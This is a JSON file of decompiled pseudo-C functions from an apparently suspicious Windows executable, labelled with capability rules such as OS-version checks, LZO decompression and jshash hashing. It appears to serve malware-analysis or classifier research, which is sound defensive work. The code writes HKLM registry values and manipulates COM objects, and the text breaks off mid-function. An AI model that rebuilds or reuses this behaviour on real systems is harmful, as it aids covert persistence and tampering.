{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar **ppuVar7;\n    uchar **ppuVar8;\n    uint *puVar9;\n    char *pcVar10;\n    bool bVar11;\n    uchar *apuStack636 [2];\n    uint var_263h;\n    uchar var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.MSVCRT.dll_sprintf;\n    // [00] -r-x section size 20480 named .text\n    puVar6 = &stack0xfffffffc;\n    puVar9 = &var_263h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    var_160h = 0;\n    puVar9 = &var_15fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar11 = arg_ch != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    ppuVar8 = &stack0xfffffffc;\n    if ((bVar11) && (ppuVar8 = &stack0xfffffffc,  !bVar11)) {\n        ppuVar7 = apuStack636 + 1;\n        ppuVar8 = apuStack636 + 1;\n        apuStack636[1] = &stack0xfffffffc;\n        cVar2 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            ppuVar7 = ppuVar7 + -1;\n            *ppuVar7 = *puVar6;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    pcVar1 = *(ppuVar8 + 8);\n    (*_sym.imp.MSVCRT.dll_sprintf)(ppuVar8 + -0x160, 0x4070a4, pcVar1);\n    (*pcVar3)(ppuVar8 + -0x264, 0x4070bc, pcVar1);\n    pcVar3 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    *(ppuVar8 + -0x20) = ppuVar8 + -0x160;\n    *(ppuVar8 + -0x18) = ppuVar8 + -0xc;\n    *(ppuVar8 + -0x14) = ppuVar8 + -4;\n    *(ppuVar8 + -0x10) = ppuVar8 + -8;\n    uVar5 = 0xffffffff;\n    pcVar10 = ppuVar8 + -0x160;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    *(ppuVar8 + -0x48) = ~uVar5 - 1;\n    uVar5 = 0xffffffff;\n    pcVar10 = pcVar1;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    *(ppuVar8 + -0x34) = 0x4070e4;\n    *(ppuVar8 + -0x30) = 0x4070f0;\n    *(ppuVar8 + -0x2c) = 0x4070fc;\n    *(ppuVar8 + -0x28) = 0x40710c;\n    *(ppuVar8 + -0x24) = 0x407114;\n    *(ppuVar8 + -0x5c) = 2;\n    *(ppuVar8 + -0x58) = 1;\n    *(ppuVar8 + -0x54) = 4;\n    *(ppuVar8 + -0x50) = 4;\n    *(ppuVar8 + -0x4c) = 4;\n    *(ppuVar8 + -0x1c) = pcVar1;\n    *(ppuVar8 + -0x44) = ~uVar5 - 1;\n    *(ppuVar8 + -0x40) = 4;\n    *(ppuVar8 + -0x3c) = 4;\n    *(ppuVar8 + -0x38) = 4;\n    if (bVar11 < 5) {\n        uVar5 = bVar11 * 4;\n        do {\n            iVar4 = (*pcVar3)(0x80000002, ppuVar8 + -0x264, *(ppuVar8 + (uVar5 - 0x34)), *(ppuVar8 + (uVar5 - 0x5c)), \n                              *(ppuVar8 + (uVar5 - 0x20)), *(ppuVar8 + (uVar5 - 0x48)));\n            if (iVar4 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1507
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404120": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404182) overlaps instruction at (ram,0x00404181)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00404120(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    uint32_t uVar3;\n    ushort in_SS;\n    bool bVar4;\n    bool bVar5;\n    uint *puStack156;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint var_68h;\n    \n    bVar4 = &stack0xfffffffc < 0x94;\n    bVar5 = (POPCOUNT(&fcn.00404120::lpVersionInformation & 0xff) & 1U) == 0;\n    puStack156 = &fcn.00404120::lpVersionInformation;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((!bVar5) && (bVar5)) {\n        segment(in_SS, *0x10 + -0x9c);\n        uVar3 = &stack0xffffff64 & 0xffff0000 | *0x10 - 0x98;\n        if (bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        if (bVar5) {\n            *(uVar3 - 4) = 0xa140;\n            *(uVar3 - 8) = 0x4074a8;\n            *(uVar3 - 0xc) = 0xb7bc9ea5;\n            *(uVar3 - 0x10) = &fcn.00404120::var_68h;\n            *(uVar3 - 0x14) = 0x404100;\n            uVar2 = fcn.00403140();\n            *arg_8h = 0x4074a8;\n            *arg_ch = 0xa140;\n            return uVar2;\n        }\n    }\n    bVar4 = (POPCOUNT(var_90h - 5U & 0xff) & 1U) == 0;\n    if (var_90h - 5U == 0) {\n        return 1;\n    }\n    if ((bVar4) || (!bVar4)) {\n        bVar4 = var_90h == 6;\n    }\n    else {\n        piVar1 = unaff_EBX + -0x8f43;\n        *piVar1 = *piVar1 + -1;\n        bVar4 = *piVar1 == 0;\n    }\n    if ((bVar4) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 649
    },
    "004042d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040436c) overlaps instruction at (ram,0x00404368)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint32_t __cdecl fcn.004042d0(uint *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code **ppcVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    ushort uVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint uVar9;\n    code *pcVar10;\n    int32_t iVar11;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    uint32_t uVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uchar *puVar20;\n    uint *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uchar *puVar24;\n    uint *puVar25;\n    uint *puVar26;\n    uint *puVar27;\n    uint *puVar28;\n    uint *puVar29;\n    uint *puVar30;\n    uchar *puVar31;\n    uint *puVar32;\n    uint *puVar33;\n    uint *puVar34;\n    uint *puVar35;\n    uchar *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    uint *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint *puVar42;\n    uint *puVar43;\n    uint *puVar44;\n    uint *puVar45;\n    uint *puVar46;\n    uchar *puVar47;\n    uint *puVar48;\n    uint *puVar49;\n    uint *in_FS_OFFSET;\n    uint8_t in_IF;\n    bool bVar50;\n    uint var_24ch;\n    uint var_147h;\n    uint hLibModule;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint hWnd;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar50 = false;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    if ((*0x10 != 0x24) && (*0x10 == 0x24)) {\n        bVar50 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    var_14h = 0x407458;\n    var_10h = 0x407450;\n    var_ch = 0x407460;\n    var_8h = 0x407468;\n    var_4h = 0x407470;\n    uVar12 = 0;\n    puVar21 = &fcn.004042d0::var_14h;\n    do {\n        puVar49 = puVar21;\n        iVar7 = (*_sym.imp.MSVCRT.dll_strstr)();\n        if (iVar7 != 0) {\n            return 1;\n        }\n        uVar12 = uVar12 + 1;\n        puVar21 = puVar49 + 1;\n    } while (uVar12 < 5);\n    if ((uVar12 < 6) || (5 < uVar12)) {\n        puVar8 = (*_sym.imp.MSVCRT.dll_strstr)();\n    }\n    else {\n        puVar48 = arg_8h + bVar50 * -2 + 1;\n        *arg_8h = *puVar21;\n        if (*0x10 == 0x25) {\n            *0xfffffffc = 0;\n            *in_FS_OFFSET = 0xfffffffc;\n            *0xfffffdac = 0;\n            puVar13 = 0xfffffda8;\n            *0xfffffda8 = 0x4043ca;\n            *0xfffffdb0 = puVar48;\n            *0xfffffdb4 = puVar49 + bVar50 * -2 + 2;\n            *0xfffffdb8 = uVar12 & 0xffff0000 | CONCAT11(0xdf, uVar12);\n            (*_sym.imp.ole32.dll_CoInitialize)();\n            *(puVar13 + -4) = 0x407410;\n            pcVar10 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n            puVar14 = puVar13 + -8;\n            *(puVar13 + -8) = 0x4043d5;\n            iVar7 = (*pcVar10)();\n            *0x68e1818c = iVar7;\n            if (iVar7 == 0) {\n                *in_FS_OFFSET = *0x68e181c4;\n                return 1;\n            }\n            *(puVar14 + -4) = 0x40741c;\n            pcVar10 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n            puVar15 = puVar14 + -8;\n            *(puVar14 + -8) = 0x4043ff;\n            uVar9 = (*pcVar10)();\n            *(puVar15 + -4) = uVar9;\n            *(puVar15 + -4) = 0x68e181b8;\n            *(puVar15 + -8) = 1000;\n            *(puVar15 + -0xc) = 2;\n            *(puVar15 + -0x10) = 0;\n            *(puVar15 + -0x14) = 0;\n            *(puVar15 + -0x18) = uVar9;\n            *(puVar15 + -0x1c) = *0x68e181d8;\n            pcVar10 = _sym.imp.USER32.dll_SendMessageTimeoutA;\n            puVar16 = puVar15 + -0x20;\n            *(puVar15 + -0x20) = 0x40441e;\n            uVar6 = (*pcVar10)();\n            *(puVar16 + -4) = puVar48;\n            *(puVar16 + -6) = uVar6;\n            *(puVar16 + -8) = extraout_DX;\n            *(puVar16 + -4) = 0x407430;\n            *(puVar16 + -8) = iVar7;\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            puVar17 = puVar16 + -0xc;\n            *(puVar16 + -0xc) = 0x404441;\n            pcVar10 = (*pcVar10)();\n            uVar9 = *0x68e181b8;\n            if (pcVar10 == NULL) {\n                *in_FS_OFFSET = *0x68e181c4;\n                return 1;\n            }\n            *0x68e181b0 = NULL;\n            *(puVar17 + -4) = 0x68e181b0;\n            *(puVar17 + -8) = 0;\n            *(puVar17 + -0xc) = str._D_3;\n            *(puVar17 + -0x10) = uVar9;\n            *0x68e181cc = 0;\n            puVar8 = puVar17 + -0x14;\n            *(puVar17 + -0x14) = 0x404471;\n            uVar12 = (*pcVar10)();\n            piVar5 = *0x68e181b0;\n            if ((uVar12 < 0) || (*0x68e181b0 == NULL)) {\n                *0x68e181cc = 0xffffffff;\n                if (*0x68e181b0 != NULL) {\n                    iVar7 = **0x68e181b0;\n                    *(puVar8 + -4) = *0x68e181b0;\n                    pcVar10 = *(iVar7 + 8);\n                    puVar46 = puVar8 + -8;\n                    puVar8 = puVar8 + -8;\n                    *puVar46 = 0x404811;\n                    (*pcVar10)();\n                }\n            }\n            else {\n                *0x68e181ac = NULL;\n                iVar7 = **0x68e181b0;\n                *(puVar8 + -4) = 0x68e181ac;\n                *(puVar8 + -8) = piVar5;\n                *0x68e181cc = 1;\n                pcVar10 = *(iVar7 + 0x20);\n                puVar18 = puVar8 + -0xc;\n                puVar8 = puVar8 + -0xc;\n                *puVar18 = 0x404497;\n                uVar12 = (*pcVar10)();\n                piVar5 = *0x68e181ac;\n                if ((-1 < uVar12) && (*0x68e181ac != NULL)) {\n                    *0x68e181b4 = 0;\n                    iVar7 = **0x68e181ac;\n                    *(puVar8 + -4) = 0x68e181b4;\n                    *(puVar8 + -8) = piVar5;\n                    pcVar10 = *(iVar7 + 0x24);\n                    puVar19 = puVar8 + -0xc;\n                    puVar8 = puVar8 + -0xc;\n                    *puVar19 = 0x4044b9;\n                    (*pcVar10)();\n                    *0x68e18190 = 0;\n                    if (0 < *0x68e181b4) {\n                        do {\n                            pcVar10 = _sym.imp.MSVCRT.dll_rand;\n                            puVar20 = puVar8 + -4;\n                            *(puVar8 + -4) = 0x4044cd;\n                            iVar11 = (*pcVar10)();\n                            uVar4 = *0x68e181a0;\n                            iVar11 = iVar11 % *0x68e181b4;\n                            *0x68e1819c = CONCAT22(*0x68e1819e, 3);\n                            *0x68e181d8 = NULL;\n                            *0x68e181c0 = NULL;\n                            *0x68e181a4 = iVar11;\n                            *(puVar20 + -4) = 0x68e181d8;\n                            piVar5 = *0x68e181ac;\n                            uVar9 = *0x68e1819c;\n                            iVar7 = **0x68e181ac;\n                            *0x68e181cc = 4;\n                            *(puVar20 + -0x14) = *0x68e1819c;\n                            *(puVar20 + -0x10) = uVar4;\n                            uVar4 = *0x68e181a8;\n                            *(puVar20 + -0xc) = iVar11;\n                            *(puVar20 + -8) = uVar4;\n                            *(puVar20 + -0x28) = piVar5;\n                            *(puVar20 + -0x24) = uVar9;\n                            *(puVar20 + -0x20) = *0x68e181a0;\n                            *(puVar20 + -0x1c) = iVar11;\n                            *(puVar20 + -0x18) = uVar4;\n                            pcVar10 = *(iVar7 + 0x2c);\n                            puVar21 = puVar20 + -0x2c;\n                            *(puVar20 + -0x2c) = 0x40451f;\n                            uVar12 = (*pcVar10)();\n                            piVar5 = *0x68e181d8;\n                            if ((uVar12 < 0) || (*0x68e181d8 == NULL)) {\n                                *0x68e181cc = 3;\n                                if (*0x68e181c0 != NULL) {\n                                    iVar7 = **0x68e181c0;\n                                    *(puVar21 + -4) = *0x68e181c0;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar42 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar42 = 0x4047b6;\n                                    (*pcVar10)();\n                                }\njoined_r0x004047bf:\n                                *0x68e181cc = 2;\n                                if (*0x68e181d8 != NULL) {\n                                    *0x68e181cc = 2;\n                                    iVar7 = **0x68e181d8;\n                                    *(puVar21 + -4) = *0x68e181d8;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar43 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar43 = 0x4047c7;\n                                    (*pcVar10)();\n                                }\n                                *(puVar21 + -4) = 0x68e1819c;\ncode_r0x004047cb:\n                                pcVar10 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                                puVar8 = puVar21 + -8;\n                                *(puVar21 + -8) = 0x4047d1;\n                                (*pcVar10)();\n                                break;\n                            }\n                            ppcVar3 = **0x68e181d8;\n                            *(puVar21 + -4) = 0x68e181c0;\n                            *(puVar21 + -8) = 0x4061b0;\n                            *(puVar21 + -0xc) = piVar5;\n                            pcVar10 = *ppcVar3;\n                            puVar22 = puVar21 + -0x10;\n                            puVar21 = puVar21 + -0x10;\n                            *puVar22 = 0x404544;\n                            uVar12 = (*pcVar10)();\n                            piVar5 = *0x68e181c0;\n                            if ((uVar12 < 0) || (*0x68e181c0 == NULL)) {\njoined_r0x00404786:\n                                if (*0x68e181c0 != NULL) {\n                                    *0x68e181cc = 3;\n                                    iVar7 = **0x68e181c0;\n                                    *(puVar21 + -4) = *0x68e181c0;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar40 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar40 = 0x40478e;\n                                    (*pcVar10)();\n                                }\n                                *0x68e181cc = 2;\n                                if (*0x68e181d8 != NULL) {\n                                    iVar7 = **0x68e181d8;\n                                    *(puVar21 + -4) = *0x68e181d8;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar41 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar41 = 0x40479f;\n                                    (*pcVar10)();\n                                }\n                                *(puVar21 + -4) = 0x68e1819c;\n                                goto code_r0x004047cb;\n                            }\n                            iVar7 = **0x68e181c0;\n                            *(puVar21 + -4) = 0x68e18198;\n                            *(puVar21 + -8) = piVar5;\n                            pcVar10 = *(iVar7 + 0x38);\n                            puVar23 = puVar21 + -0xc;\n                            puVar21 = puVar21 + -0xc;\n                            *puVar23 = 0x404563;\n                            uVar12 = (*pcVar10)();\n                            iVar7 = *0x68e18198;\n                            if (uVar12 < 0) goto joined_r0x00404786;\n                            if (*0x68e18198 == 0) {\njoined_r0x004045c2:\n                                if (*0x68e181c0 != NULL) {\n                                    *0x68e181cc = 3;\n                                    iVar7 = **0x68e181c0;\n                                    *(puVar21 + -4) = *0x68e181c0;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar26 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar26 = 0x4045ca;\n                                    (*pcVar10)();\n                                }\n                                *0x68e181cc = 2;\n                                if (*0x68e181d8 != NULL) {\n                                    iVar7 = **0x68e181d8;\n                                    *(puVar21 + -4) = *0x68e181d8;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar27 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar27 = 0x4045db;\n                                    (*pcVar10)();\n                                }\n                                *(puVar21 + -4) = 0x68e1819c;\n                            }\n                            else {\n                                *(puVar21 + -4) = 0x104;\n                                *(puVar21 + -8) = 0x68e17f84;\n                                *(puVar21 + -0xc) = iVar7;\n                                *(puVar21 + -0x10) = 0x404593;\n                                fcn.004041b0();\n                                *(puVar21 + -4) = *0x68e18198;\n                                pcVar10 = _sym.imp.OLEAUT32.dll_SysStringLen;\n                                puVar24 = puVar21 + -8;\n                                *(puVar21 + -8) = 0x4045a0;\n                                (*pcVar10)();\n                                *(puVar24 + -4) = 0x407444;\n                                *(puVar24 + -8) = 0x68e17f84;\n                                pcVar10 = _sym.imp.MSVCRT.dll__stricmp;\n                                puVar25 = puVar24 + -0xc;\n                                *(puVar24 + -0xc) = 0x4045b2;\n                                iVar7 = (*pcVar10)();\n                                piVar5 = *0x68e181d8;\n                                puVar21 = puVar25 + 2;\n                                if (iVar7 != 0) goto joined_r0x004045c2;\n                                *0x68e181bc = NULL;\n                                puVar25[1] = 0x68e181bc;\n                                *puVar25 = 0x4061a0;\n                                ppcVar3 = *piVar5;\n                                puVar25[-1] = piVar5;\n                                *0x68e181cc = 5;\n                                pcVar10 = *ppcVar3;\n                                puVar21 = puVar25 + -2;\n                                puVar25[-2] = 0x4045fc;\n                                uVar12 = (*pcVar10)();\n                                piVar5 = *0x68e181bc;\n                                if ((uVar12 < 0) || (*0x68e181bc == NULL)) {\n                                    *0x68e181cc = 4;\n                                    if (*0x68e181bc != NULL) {\n                                        iVar7 = **0x68e181bc;\n                                        *(puVar21 + -4) = *0x68e181bc;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar38 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar38 = 0x404762;\n                                        (*pcVar10)();\n                                    }\njoined_r0x0040476b:\n                                    if (*0x68e181c0 != NULL) {\n                                        *0x68e181cc = 3;\n                                        iVar7 = **0x68e181c0;\n                                        *(puVar21 + -4) = *0x68e181c0;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar39 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar39 = 0x404773;\n                                        (*pcVar10)();\n                                    }\n                                    goto joined_r0x004047bf;\n                                }\n                                iVar7 = **0x68e181bc;\n                                *(puVar21 + -4) = 0x68e18194;\n                                *(puVar21 + -8) = piVar5;\n                                pcVar10 = *(iVar7 + 0x20);\n                                puVar28 = puVar21 + -0xc;\n                                puVar21 = puVar21 + -0xc;\n                                *puVar28 = 0x40461b;\n                                uVar12 = (*pcVar10)();\n                                iVar7 = *0x68e18194;\n                                if (uVar12 < 0) {\n                                    *0x68e181cc = 4;\n                                    if (*0x68e181bc != NULL) {\n                                        iVar7 = **0x68e181bc;\n                                        *(puVar21 + -4) = *0x68e181bc;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar35 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar35 = 0x404715;\n                                        (*pcVar10)();\n                                    }\n                                    goto joined_r0x0040476b;\n                                }\n                                if (*0x68e18194 == 0) {\n                                    *0x68e181cc = 4;\n                                    if (*0x68e181bc != NULL) {\n                                        iVar7 = **0x68e181bc;\n                                        *(puVar21 + -4) = *0x68e181bc;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar29 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar29 = 0x40463d;\n                                        (*pcVar10)();\n                                    }\n                                    *0x68e181cc = 3;\n                                    if (*0x68e181c0 != NULL) {\n                                        iVar7 = **0x68e181c0;\n                                        *(puVar21 + -4) = *0x68e181c0;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar30 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar30 = 0x40464e;\n                                        (*pcVar10)();\n                                    }\n                                }\n                                else {\n                                    *0x68e18088 = 0;\n                                    puVar49 = 0x68e18089;\n                                    for (iVar11 = 0x40; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                        *puVar49 = 0;\n                                        puVar49 = puVar49 + bVar50 * -2 + 1;\n                                    }\n                                    *puVar49 = 0;\n                                    *(puVar49 + bVar50 * -4 + 2) = 0;\n                                    *(puVar21 + -4) = 0x104;\n                                    *(puVar21 + -8) = 0x68e18088;\n                                    *(puVar21 + -0xc) = iVar7;\n                                    *(puVar21 + -0x10) = 0x404689;\n                                    fcn.004041b0();\n                                    *(puVar21 + -4) = *0x68e18194;\n                                    pcVar10 = _sym.imp.OLEAUT32.dll_SysStringLen;\n                                    puVar31 = puVar21 + -8;\n                                    *(puVar21 + -8) = 0x404696;\n                                    (*pcVar10)();\n                                    *(puVar31 + -4) = 0x68e18088;\n                                    *(puVar31 + -8) = 0x4046a2;\n                                    iVar7 = fcn.004042d0(*(puVar31 + -4));\n                                    if (iVar7 == 0) {\n                                        *(puVar31 + -4) = 10;\n                                        pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n                                        puVar36 = puVar31 + -8;\n                                        *(puVar31 + -8) = 0x40472a;\n                                        (*pcVar10)();\n                                        piVar5 = *0x68e181c0;\n                                        *(puVar36 + -4) = *0x68e181c0;\n                                        pcVar10 = *(*piVar5 + 0x114);\n                                        puVar21 = puVar36 + -8;\n                                        *(puVar36 + -8) = 0x404736;\n                                        (*pcVar10)();\n                                        *0x68e181cc = 4;\n                                        if (*0x68e181bc != NULL) {\n                                            iVar7 = **0x68e181bc;\n                                            *(puVar21 + -4) = *0x68e181bc;\n                                            pcVar10 = *(iVar7 + 8);\n                                            puVar37 = puVar21 + -8;\n                                            puVar21 = puVar21 + -8;\n                                            *puVar37 = 0x404747;\n                                            (*pcVar10)();\n                                        }\n                                        goto joined_r0x00404786;\n                                    }\n                                    *(puVar31 + -4) = 0;\n                                    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n                                    puVar21 = puVar31 + -8;\n                                    *(puVar31 + -8) = 0x4046b0;\n                                    (*pcVar10)();\n                                    *0x68e181cc = 4;\n                                    if (*0x68e181bc != NULL) {\n                                        iVar7 = **0x68e181bc;\n                                        *(puVar21 + -4) = *0x68e181bc;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar32 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar32 = 0x4046c1;\n                                        (*pcVar10)();\n                                    }\n                                    *0x68e181cc = 3;\n                                    if (*0x68e181c0 != NULL) {\n                                        iVar7 = **0x68e181c0;\n                                        *(puVar21 + -4) = *0x68e181c0;\n                                        pcVar10 = *(iVar7 + 8);\n                                        puVar33 = puVar21 + -8;\n                                        puVar21 = puVar21 + -8;\n                                        *puVar33 = 0x4046d2;\n                                        (*pcVar10)();\n                                    }\n                                }\n                                *0x68e181cc = 2;\n                                if (*0x68e181d8 != NULL) {\n                                    *0x68e181cc = 2;\n                                    iVar7 = **0x68e181d8;\n                                    *(puVar21 + -4) = *0x68e181d8;\n                                    pcVar10 = *(iVar7 + 8);\n                                    puVar34 = puVar21 + -8;\n                                    puVar21 = puVar21 + -8;\n                                    *puVar34 = 0x4046e3;\n                                    (*pcVar10)();\n                                }\n                                *(puVar21 + -4) = 0x68e1819c;\n                            }\n                            pcVar10 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                            puVar8 = puVar21 + -8;\n                            *(puVar21 + -8) = 0x4046ed;\n                            (*pcVar10)();\n                            *0x68e18190 = *0x68e18190 + 1;\n                        } while (*0x68e18190 < *0x68e181b4);\n                    }\n                }\n                if (*0x68e181ac != NULL) {\n                    *0x68e181cc = *0x68e181cd << 8;\n                    iVar7 = **0x68e181ac;\n                    *(puVar8 + -4) = *0x68e181ac;\n                    pcVar10 = *(iVar7 + 8);\n                    puVar44 = puVar8 + -8;\n                    puVar8 = puVar8 + -8;\n                    *puVar44 = 0x4047e1;\n                    (*pcVar10)();\n                }\n                *0x68e181cc = 0xffffffff;\n                if (*0x68e181b0 != NULL) {\n                    iVar7 = **0x68e181b0;\n                    *(puVar8 + -4) = *0x68e181b0;\n                    pcVar10 = *(iVar7 + 8);\n                    puVar45 = puVar8 + -8;\n                    puVar8 = puVar8 + -8;\n                    *puVar45 = 0x4047f5;\n                    (*pcVar10)();\n                }\n            }\n            *(puVar8 + -4) = *0x68e1818c;\n            pcVar10 = _sym.imp.KERNEL32.dll_FreeLibrary;\n            puVar47 = puVar8 + -8;\n            *(puVar8 + -8) = 0x40481b;\n            (*pcVar10)();\n            pcVar10 = _sym.imp.ole32.dll_CoUninitialize;\n            *(puVar47 + -4) = 0x404821;\n            (*pcVar10)();\n            *in_FS_OFFSET = *0x68e181c4;\n            return uVar12;\n        }\n        puVar1 = puVar48 + -1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + extraout_DL;\n        puVar8 = &stack0x004060af + CARRY1(uVar2, extraout_DL);\n    }\n    return puVar8 == NULL;\n}\n",
        "token_count": 6671
    },
    "004012b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013ec) overlaps instruction at (ram,0x004013ea)\n// \n\nuint __cdecl fcn.004012b0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint *puVar15;\n    bool bVar16;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_14h;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar10 = &var_22fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    var_12ch = '\\0';\n    puVar10 = &var_12bh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar6 = 0xffffffff;\n    pcVar13 = &lpBuffer;\n    do {\n        pcVar12 = pcVar13;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar12;\n    } while (cVar1 != '\\0');\n    uVar6 = ~uVar6;\n    puVar10 = pcVar12 + 